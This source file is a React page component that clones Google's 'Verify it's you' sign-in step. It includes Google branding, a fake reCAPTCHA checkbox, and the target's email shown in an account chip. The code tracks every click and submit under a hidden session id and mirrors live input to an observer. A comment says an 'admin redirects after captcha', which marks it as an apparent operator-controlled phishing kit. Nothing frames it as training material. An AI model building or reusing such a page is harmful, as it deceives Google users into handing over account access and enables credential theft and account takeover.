import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  geAvatarColor,
  geInitials,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/captcha")({
  head: () => ({
    meta: [
      { title: "Verify it’s you - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeCaptchaPage,
});

/** Fake reCAPTCHA v2 checkbox widget (304×78), visual clone — no Google scripts. */
function FakeRecaptcha({
  checked,
  onToggle,
}: {
  checked: boolean;
  onToggle: () => void;
}) {
  return (
    <button
      type="button"
      className={`ge-rc${checked ? " is-checked" : ""}`}
      onClick={onToggle}
      aria-pressed={checked}
      aria-label="I'm not a robot"
    >
      <span className="ge-rc-check-wrap" aria-hidden="true">
        <span className="ge-rc-box">
          {checked ? (
            <svg className="ge-rc-tick" viewBox="0 0 24 24">
              <path
                fill="#009E73"
                d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
              />
            </svg>
          ) : null}
        </span>
      </span>
      <span className="ge-rc-label">I&apos;m not a robot</span>
      <span className="ge-rc-brand" aria-hidden="true">
        <svg className="ge-rc-logo" viewBox="0 0 32 32" width="32" height="32">
          <path
            fill="#1c3aa9"
            d="M16 2c-2.8 7.2-6.2 10.6-13.4 13.4C9.8 18.2 13.2 21.6 16 28.8c2.8-7.2 6.2-10.6 13.4-13.4C22.2 12.6 18.8 9.2 16 2z"
          />
          <path
            fill="#4285f4"
            d="M16 6.2c-1.7 4.5-3.9 6.6-8.4 8.3 4.5 1.7 6.7 3.8 8.4 8.3 1.7-4.5 3.9-6.6 8.4-8.3-4.5-1.7-6.7-3.8-8.4-8.3z"
          />
          <circle cx="16" cy="14.5" r="3.2" fill="#fff" />
          <circle cx="16" cy="14.5" r="1.6" fill="#1c3aa9" />
        </svg>
        <span className="ge-rc-brand-text">
          <span className="ge-rc-name">reCAPTCHA</span>
          <span className="ge-rc-links">
            <span>Privacy</span>
            <span> - </span>
            <span>Terms</span>
          </span>
        </span>
      </span>
    </button>
  );
}

const GE_CAPTCHA_CSS = `
${GE_SHELL_CSS}

.ge-captcha .ge-title { margin-top: 24px; }

.ge-captcha-lead {
  margin: 16px 0 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
.ge-captcha-lead a {
  color: var(--gm3-primary);
  font-weight: 500;
  text-decoration: none;
}
.ge-captcha-lead a:hover { text-decoration: underline; }

.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 24px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: var(--gm3-card);
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
}
.ge-account-chip:hover { background: rgba(227, 227, 227, 0.08); }
.ge-avatar {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  color: #fff;
  font-size: 10px;
  font-weight: 500;
  line-height: 1;
  user-select: none;
  margin-right: 8px;
}
.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}

.ge-captcha-prompt {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-captcha .ge-pane-right {
    padding-top: 72px;
  }
}

.ge-captcha-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-captcha-form { margin-top: 22px; }
}

/* Fake reCAPTCHA — light theme widget on dark page */
.ge-rc {
  display: flex;
  align-items: center;
  width: 304px;
  height: 78px;
  padding: 0 12px 0 14px;
  margin: 0;
  border: 1px solid #d3d3d3;
  border-radius: 3px;
  background: #f9f9f9;
  box-shadow: 0 0 4px 1px rgba(0,0,0,.08);
  cursor: pointer;
  text-align: left;
  font-family: Roboto, Helvetica, Arial, sans-serif;
  color: #000;
  box-sizing: border-box;
}
.ge-rc:focus-visible {
  outline: 2px solid #4285f4;
  outline-offset: 2px;
}
.ge-rc-check-wrap {
  flex-shrink: 0;
  margin-right: 12px;
}
.ge-rc-box {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 28px;
  height: 28px;
  border: 2px solid #c1c1c1;
  border-radius: 2px;
  background: #fff;
  box-sizing: border-box;
}
.ge-rc.is-checked .ge-rc-box {
  border-color: transparent;
  background: transparent;
}
.ge-rc-tick {
  width: 30px;
  height: 30px;
  display: block;
}
.ge-rc-label {
  flex: 1;
  min-width: 0;
  font-size: 14px;
  font-weight: 400;
  line-height: 17px;
  color: #000;
}
.ge-rc-brand {
  display: flex;
  flex-direction: column;
  align-items: center;
  flex-shrink: 0;
  width: 58px;
  margin-left: 8px;
}
.ge-rc-logo { display: block; margin-bottom: 2px; }
.ge-rc-brand-text {
  display: flex;
  flex-direction: column;
  align-items: center;
  line-height: 1;
}
.ge-rc-name {
  font-size: 10px;
  font-weight: 400;
  color: #555;
  letter-spacing: 0;
}
.ge-rc-links {
  font-size: 8px;
  color: #555;
  margin-top: 2px;
  white-space: nowrap;
}

.ge-actions {
  display: flex;
  flex-direction: row;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
  margin-top: auto;
  padding-top: 32px;
  gap: 8px;
  width: 100%;
}
.ge-btn-text {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-text:hover { background: rgba(138, 180, 248, 0.08); }
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GeCaptchaPage() {
  const { trackClick, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [checked, setChecked] = useState(false);

  const initials = useMemo(() => (email ? geInitials(email) : ""), [email]);
  const avatarBg = useMemo(
    () => (email ? geAvatarColor(email) : "rgb(95, 99, 104)"),
    [email],
  );

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (d.field === "email" || d.field === "email_submitted" || d.field === "identifier") {
        setEmail(value);
        setGeEmail(value);
      }
      if (d.field === "recaptcha" || d.field === "captcha") {
        setChecked(value === "1" || value === "true" || value === "checked");
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const handleToggle = () => {
    const next = !checked;
    setChecked(next);
    trackClick(next ? "reCAPTCHA checked" : "reCAPTCHA unchecked");
  };

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!checked) return;
    trackClick("Next");
    trackSubmit("recaptcha", "checked");
    // Stay put — admin redirects after captcha
  };

  return (
    <div className="ge-shell ge-captcha">
      <GeFontStyle />
      <style>{GE_CAPTCHA_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Verify it{"\u2019"}s you</h1>
          <p className="ge-captcha-lead">
            To help keep your account safe, Google wants to make sure it{"\u2019"}s
            really you trying to sign in.{" "}
            <a
              href="https://support.google.com/accounts/answer/40039?hl=en"
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => trackClick("Learn more")}
            >
              Learn more
            </a>
          </p>
          <button
            type="button"
            className="ge-account-chip"
            aria-label={`${email || "Account"} selected. Switch account`}
            onClick={() => trackClick("Switch account")}
          >
            <span className="ge-avatar" style={{ background: avatarBg }} aria-hidden="true">
              {initials || "?"}
            </span>
            <span className="ge-account-email">{email || "Account"}</span>
            <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M7 9.5l5 5 5-5H7z" />
            </svg>
          </button>
        </div>

        <div className="ge-pane-right">
          <p className="ge-captcha-prompt">Confirm you{"\u2019"}re not a robot</p>
          <form className="ge-captcha-form" onSubmit={handleNext} autoComplete="off">
            <FakeRecaptcha checked={checked} onToggle={handleToggle} />

            <div className="ge-actions">
              <button
                type="button"
                className="ge-btn-text"
                onClick={() => trackClick("Try another way")}
              >
                Try another way
              </button>
              <button type="submit" className="ge-btn ge-btn-next" disabled={!checked}>
                Next
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
